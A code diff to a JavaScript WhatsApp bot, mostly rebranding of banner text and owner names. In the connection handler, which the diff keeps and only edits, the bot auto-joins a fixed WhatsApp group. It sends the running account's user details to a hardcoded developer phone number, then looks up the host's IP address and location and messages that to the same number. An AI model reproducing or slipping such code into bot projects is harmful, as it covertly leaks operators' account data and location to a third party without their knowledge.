@@ -83,7 +83,7 @@ const starts = async (client = new WAConnection()) => {
   });
   client.on("open", () => {
     success("2", "Successfully connected to wa, Subscribe Monster");
-console.log(color(figlet.textSync(`${spc1}            Monster Bot`, {
+console.log(color(figlet.textSync(`${spc1}            ☯︎-SEAGM-☯︎ Bot`, {
 font: 'Standard',
 horizontalLayout: 'default',
 vertivalLayout: 'default',
@@ -92,10 +92,10 @@ whitespaceBreak: false
 }), 'cyan'))
 console.log(color(`${spc2}[ • CREATOR BOT ${fakeyoi} • ]` ,'cyan'))
 console.log(color(`${spc4}< ================================================== >`, 'cyan'))
-console.log(color(`${spc3}[•]`, 'aqua'), color(`Hi        : ${ucapanWaktu}`, 'white'))
+console.log(color(`${spc3}[•]`, 'aqua'), color(`Hai    : ${ucapanWaktu}`, 'white'))
 console.log(color(`${spc3}[•]`, 'aqua'), color(`Bot Version : 2.1.2`, 'white'))
 console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white'))
-console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${fakeyoi}`, 'white'))
+console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner    : ${fakeyoi}`, 'white'))
 console.log(color(`${spc4}< ================================================== >`, 'cyan'))
 
     console.log(color('⎇','red'), color('\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙢𝙤𝙣𝙨𝙩𝙚𝙧 𝙮𝙩', 'yellow'))
@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/E6kGrmOhmo9FtNvonhrjy1`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`60175575245@s.whatsapp.net`, `*Hi Owner Helmi, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Helmi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Akbar.jpg'),sourceUrl:"https://wa.me/60175575245?text=Hello bro"}}})
+ client.sendMessage(`60175575245@s.whatsapp.net`, `*Hi Owner Helmi, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Helmi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Helmi.jpg'),sourceUrl:"https://wa.me/60175575245?text=Hello bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("60175575245@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Helmi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Akbar.jpg'),sourceUrl:"https://wa.me/60175575245?text=Hello bro"}}})
+       client.sendMessage("60175575245@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Helmi Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Helmi.jpg'),sourceUrl:"https://wa.me/60175575245?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -140,7 +140,7 @@ fkontakk = { key: {
     participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '60175575245-1604595598@g.us' } : {})
 },
  message: {
-    "contactMessage":{"displayName":'Akbar',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Akbar;;;\nFN:resku\nitem1.TEL;waid=60175575245:+91 967-7331-878\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+    "contactMessage":{"displayName":'Helmi',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Helmi;;;\nFN:resku\nitem1.TEL;waid=60175575245:+91 967-7331-878\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  }}}
 metdata = await client.groupMetadata(anu.jid)
 if(anu.announce == 'false'){
